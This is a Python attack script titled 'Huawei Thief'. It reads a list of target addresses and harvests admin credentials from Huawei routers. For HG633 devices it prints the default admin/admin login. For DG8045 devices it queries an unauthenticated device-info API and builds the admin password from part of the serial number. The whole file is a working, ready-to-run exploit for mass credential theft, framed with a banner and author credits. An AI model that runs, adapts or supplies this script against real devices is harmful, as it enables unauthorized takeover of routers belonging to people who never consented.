#Author: Zeyad Azima
#Facebook: https://facebook.com/elkingzeyad.azeem
#Github: https://github.com/Cyber-Atom
#Website: https://cyberatom.org/

import requests,sys,colored,json
from colored import stylize
banner = (f"""
██╗  ██╗██╗   ██╗ █████╗ ██╗    ██╗███████╗██╗    ████████╗██╗  ██╗██╗███████╗███████╗
██║  ██║██║   ██║██╔══██╗██║    ██║██╔════╝██║    ╚══██╔══╝██║  ██║██║██╔════╝██╔════╝
███████║██║   ██║███████║██║ █╗ ██║█████╗  ██║       ██║   ███████║██║█████╗  █████╗  
██╔══██║██║   ██║██╔══██║██║███╗██║██╔══╝  ██║       ██║   ██╔══██║██║██╔══╝  ██╔══╝  
██║  ██║╚██████╔╝██║  ██║╚███╔███╔╝███████╗██║       ██║   ██║  ██║██║███████╗██║     
╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚══╝╚══╝ ╚══════╝╚═╝       ╚═╝   ╚═╝  ╚═╝╚═╝╚══════╝╚═╝       
                                     By: Zeyad Azima
                               https://github.com/Cyber-Atom   
                 this tool works on DG8045 & HG633 Versions of Huawei devices
-------------------------------------------------------------------------------------------------
""")

def Start(azima):
    f = open(azima,'r+')
    read = f.read()
    list = read.splitlines()

    try:
        for target in list:
            requests.packages.urllib3.disable_warnings()
            req = requests.get(f'http://{target}', verify=False)
            res = req.text
            if "HG633" in res:
                print(stylize(f"[+] {target}:",colored.fg('green')))
                print(stylize("Username: admin \nPassword: admin",colored.fg('blue')))
                print("-------------------------------------")
            elif "DG8045" in res:
                r = requests.get(f'http://{target}/api/system/deviceinfo', verify=False)
                if r.status_code == 200:
                    code = r.text
                    m = code.replace('while(1); /*', '')
                    c = m.replace('*/','')
                    f = open('data.json','w+')
                    f.write(c)
                    f.close()
                    with open('data.json', 'r+') as lst:
                        serial = json.load(lst)
                        a = [serial['SerialNumber'][12],serial['SerialNumber'][13],serial['SerialNumber'][14],serial['SerialNumber'][15],serial['SerialNumber'][16],serial['SerialNumber'][17],serial['SerialNumber'][18],serial['SerialNumber'][19]]
                        b,c,d,e,f,g,h,i = a
                        password = (b+c+d+e+f+g+h+i)
                        print(stylize(f"[+] {target} :",colored.fg('green')))
                        print(stylize(f"Username: admin \nPassword: {password}",colored.fg('blue')))
                        print("-------------------------------------")
                else:
                    pass
            else:
                print(stylize(f"[-] {target} is not DG8045 OR HG633 ",colored.fg('red')))
                print("-------------------------------------")
    except requests.ConnectionError:
        pass




print(stylize(banner,colored.fg('red')))
try:
    Start(sys.argv[1])
except IndexError:
    print(stylize("""[-] Please specify target list
ex: python3 Huwawei_thief.py target.txt""",colored.fg('blue')))
